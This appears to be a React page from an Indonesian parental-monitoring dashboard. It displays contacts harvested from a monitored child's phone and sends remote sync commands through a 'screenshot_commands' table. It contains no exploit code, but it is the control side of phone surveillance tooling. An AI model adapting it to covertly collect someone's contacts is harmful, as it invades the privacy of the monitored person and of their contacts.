'use client';

import React, { useEffect, useState, useCallback } from 'react';
import { Users, RefreshCw, Loader2, AlertTriangle, Search, X, Phone, Mail, ChevronDown, ChevronUp, Trash2 } from 'lucide-react';
import { supabase } from '../../../lib/supabase';

interface Contact {
  id: number;
  device_id: string;
  contact_name: string;
  phone_numbers: string[];
  emails: string[];
  synced_at: string;
}

function timeAgo(dateStr: string): string {
  const diff = Date.now() - new Date(dateStr).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return 'Baru saja';
  if (mins < 60) return `${mins} mnt lalu`;
  const h = Math.floor(mins / 60);
  if (h < 24) return `${h} jam lalu`;
  return `${Math.floor(h / 24)} hari lalu`;
}

export default function ContactsPage() {
  const [loading, setLoading]       = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [device, setDevice]         = useState<any>(null);
  const [contacts, setContacts]     = useState<Contact[]>([]);
  const [error, setError]           = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [expandedId, setExpandedId]   = useState<number | null>(null);
  const [deletingIds, setDeletingIds] = useState<Set<number>>(new Set());

  const [triggeringSync, setTriggeringSync] = useState(false);
  const [syncSuccess, setSyncSuccess] = useState(false);

  const [clearingAll, setClearingAll]   = useState(false);
  const [confirmClear, setConfirmClear] = useState(false);

  const fetchData = useCallback(async (dev?: any, silent = false) => {
    const target = dev || device;
    if (!target) return;
    if (!silent) setRefreshing(true);
    try {
      const { data, error: e } = await supabase
        .from('contacts')
        .select('*')
        .eq('device_id', target.id)
        .order('contact_name', { ascending: true });
      if (e) throw e;
      setContacts(data || []);
      setError(null);
    } catch (err: any) {
      setError(err?.message ?? 'Gagal memuat kontak');
    } finally {
      setRefreshing(false);
    }
  }, [device]);

  const handleRefreshFromPhone = async () => {
    if (!device || triggeringSync) return;
    setTriggeringSync(true);
    setSyncSuccess(false);
    try {
      const { data, error } = await supabase
        .from('screenshot_commands')
        .insert({
          device_id: device.id,
          command_type: 'CONTACTS',
          status: 'PENDING'
        })
        .select()
        .single();

      if (error) throw error;
      const cmdId = data.id;

      let attempts = 0;
      const interval = setInterval(async () => {
        attempts++;
        const { data: cmd, error: cmdErr } = await supabase
          .from('screenshot_commands')
          .select('status')
          .eq('id', cmdId)
          .single();

        if (!cmdErr && cmd) {
          if (cmd.status === 'EXECUTED') {
            clearInterval(interval);
            setSyncSuccess(true);
            setTriggeringSync(false);
            fetchData();
            setTimeout(() => setSyncSuccess(false), 3000);
          } else if (cmd.status === 'FAILED' || attempts > 20) {
            clearInterval(interval);
            setTriggeringSync(false);
            alert('Gagal menyinkronkan data kontak dari HP anak. Pastikan HP anak aktif.');
          }
        }
      }, 2000);

    } catch (err: any) {
      console.error(err);
      alert(err.message || 'Gagal mengirim perintah sinkronisasi');
      setTriggeringSync(false);
    }
  };

  useEffect(() => {
    const init = async () => {
      setLoading(true);
      try {
        const { data } = await supabase.from('devices').select('*').order('created_at', { ascending: false });
        if (!data?.length) { setLoading(false); return; }
        const saved = typeof window !== 'undefined' ? localStorage.getItem('selected_device_id') : null;
        const dev = data.find((d: any) => d.id === saved) || data[0];
        setDevice(dev);
        await fetchData(dev);
      } finally { setLoading(false); }
    };
    init();
  }, []);

  const handleDelete = async (item: Contact) => {
    setDeletingIds(prev => new Set(prev).add(item.id));
    if (expandedId === item.id) setExpandedId(null);
    setContacts(prev => prev.filter(c => c.id !== item.id));
    await supabase.from('contacts').delete().eq('id', item.id);
    setDeletingIds(prev => { const n = new Set(prev); n.delete(item.id); return n; });
  };

  const filtered = contacts.filter(c =>
    !searchQuery ||
    c.contact_name.toLowerCase().includes(searchQuery.toLowerCase()) ||
    c.phone_numbers.some(p => p.includes(searchQuery)) ||
    c.emails.some(e => e.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  const lastSync = contacts[0]?.synced_at;

  const handleClearAll = async () => {
    if (!device) return;
    if (!confirmClear) { setConfirmClear(true); return; }
    setClearingAll(true);
    setConfirmClear(false);
    try {
      await supabase.from('contacts').delete().eq('device_id', device.id);
      await fetchData();
    } catch (err: any) {
      console.error('Clear all failed', err);
    } finally {
      setClearingAll(false);
    }
  };

  if (loading) return (
    <div className="flex items-center justify-center min-h-[60vh] gap-3 text-textSecondary">
      <Loader2 className="animate-spin text-accentViolet" size={36} />
      <p className="text-sm">Memuat daftar kontak...</p>
    </div>
  );

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between flex-wrap gap-4">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Daftar Kontak</h1>
          <p className="text-textSecondary mt-1 text-sm">
            Kontak tersimpan di perangkat · {contacts.length} kontak
            {lastSync && <span className="ml-2 opacity-60">· sync {timeAgo(lastSync)}</span>}
          </p>
        </div>
        <div className="flex items-center gap-3">
          {triggeringSync && (
            <span className="text-xs text-accentYellow animate-pulse font-medium">Menyinkronkan dari HP...</span>
          )}
          {syncSuccess && (
            <span className="text-xs text-accentGreen font-medium">Sinkronisasi Sukses!</span>
          )}
          <div className="flex items-center gap-2">
          <button 
            onClick={handleRefreshFromPhone} 
            disabled={triggeringSync}
            className="p-2.5 glass-card rounded-xl text-textSecondary hover:text-textPrimary disabled:opacity-55"
            title="Minta Update HP"
          >
            <RefreshCw size={16} className={triggeringSync || refreshing ? 'animate-spin' : ''} />
          </button>
          <button
            onClick={handleClearAll}
            disabled={clearingAll || !device}
            onMouseLeave={() => setConfirmClear(false)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold transition-all disabled:opacity-40 ${
              confirmClear
                ? 'bg-red-600 text-white animate-pulse'
                : 'glass-card text-accentRed/70 hover:bg-red-950/30 hover:text-accentRed border border-red-900/20'
            }`}
          >
            {clearingAll ? <Loader2 size={13} className="animate-spin" /> : <Trash2 size={13} />}
            {clearingAll ? 'Menghapus...' : confirmClear ? 'Konfirmasi hapus semua?' : 'Hapus Semua Kontak'}
          </button>
          </div>
        </div>
      </div>

      {error && (
        <div className="flex gap-3 p-4 bg-red-950/30 border border-red-900/40 rounded-xl">
          <AlertTriangle size={18} className="text-red-400 shrink-0 mt-0.5" />
          <p className="text-red-300 text-xs font-mono">{error}</p>
        </div>
      )}

      {/* Stats */}
      <div className="grid grid-cols-3 gap-4">
        {[
          { label: 'Total Kontak',  value: contacts.length,                                      color: 'text-accentViolet' },
          { label: 'Punya Nomor',   value: contacts.filter(c => c.phone_numbers.length > 0).length, color: 'text-accentGreen'  },
          { label: 'Punya Email',   value: contacts.filter(c => c.emails.length > 0).length,        color: 'text-accentBlue'   },
        ].map((s, i) => (
          <div key={i} className="glass-card rounded-xl p-4 text-center">
            <p className={`text-2xl font-bold ${s.color}`}>{s.value}</p>
            <p className="text-[11px] text-textSecondary mt-0.5">{s.label}</p>
          </div>
        ))}
      </div>

      {/* Search */}
      <div className="relative">
        <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-textSecondary" />
        <input
          type="text"
          placeholder="Cari nama, nomor, atau email..."
          value={searchQuery}
          onChange={e => setSearchQuery(e.target.value)}
          className="w-full pl-8 pr-8 py-2.5 text-xs bg-darkBg border border-borderDark rounded-lg text-textPrimary placeholder-textSecondary/50 focus:outline-none focus:border-accentViolet"
        />
        {searchQuery && (
          <button onClick={() => setSearchQuery('')} className="absolute right-3 top-1/2 -translate-y-1/2 text-textSecondary hover:text-textPrimary">
            <X size={12} />
          </button>
        )}
      </div>

      {/* Contact list */}
      {filtered.length === 0 ? (
        <div className="glass-card rounded-2xl p-16 text-center">
          <Users size={48} className="text-textSecondary/30 mx-auto mb-4" />
          <p className="text-sm text-textSecondary">
            {contacts.length === 0
              ? 'Belum ada data kontak. Sync otomatis setiap 2 jam.'
              : 'Tidak ada kontak yang cocok dengan pencarian.'}
          </p>
        </div>
      ) : (
        <div className="glass-card rounded-2xl overflow-hidden">
          <div className="px-5 py-3 border-b border-borderDark/40 flex items-center justify-between">
            <span className="text-xs text-textSecondary font-semibold">{filtered.length} kontak ditampilkan</span>
          </div>
          <div className="divide-y divide-borderDark/20 max-h-[600px] overflow-y-auto">
            {filtered.map(contact => {
              const expanded = expandedId === contact.id;
              return (
                <div key={contact.id}
                  className="flex items-start gap-3 px-5 py-3 hover:bg-white/[0.02] transition-colors">
                  {/* Avatar */}
                  <div className="shrink-0 w-9 h-9 rounded-full bg-accentViolet/15 text-accentViolet flex items-center justify-center font-bold text-sm">
                    {contact.contact_name.charAt(0).toUpperCase()}
                  </div>
                  {/* Info */}
                  <div className="flex-1 min-w-0">
                    <button
                      onClick={() => setExpandedId(expanded ? null : contact.id)}
                      className="flex items-center gap-1 text-left w-full"
                    >
                      <span className="text-sm font-semibold text-textPrimary truncate">{contact.contact_name}</span>
                      {(contact.phone_numbers.length > 0 || contact.emails.length > 0) && (
                        expanded ? <ChevronUp size={12} className="shrink-0 text-textSecondary" /> : <ChevronDown size={12} className="shrink-0 text-textSecondary" />
                      )}
                    </button>
                    {/* Preview line (unexpanded) */}
                    {!expanded && contact.phone_numbers.length > 0 && (
                      <p className="text-xs text-textSecondary mt-0.5 truncate">{contact.phone_numbers[0]}</p>
                    )}
                    {/* Expanded detail */}
                    {expanded && (
                      <div className="mt-2 space-y-1">
                        {contact.phone_numbers.map((p, i) => (
                          <div key={i} className="flex items-center gap-2 text-xs text-textSecondary">
                            <Phone size={11} className="shrink-0 text-accentGreen" />
                            <span className="font-mono">{p}</span>
                          </div>
                        ))}
                        {contact.emails.map((e, i) => (
                          <div key={i} className="flex items-center gap-2 text-xs text-textSecondary">
                            <Mail size={11} className="shrink-0 text-accentBlue" />
                            <span className="truncate">{e}</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                  {/* Delete */}
                  <button
                    onClick={() => handleDelete(contact)}
                    disabled={deletingIds.has(contact.id)}
                    className="shrink-0 p-1.5 text-textSecondary/30 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-all disabled:opacity-30"
                    title="Hapus kontak ini dari monitoring"
                  >
                    {deletingIds.has(contact.id)
                      ? <Loader2 size={13} className="animate-spin" />
                      : <X size={13} />}
                  </button>
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}
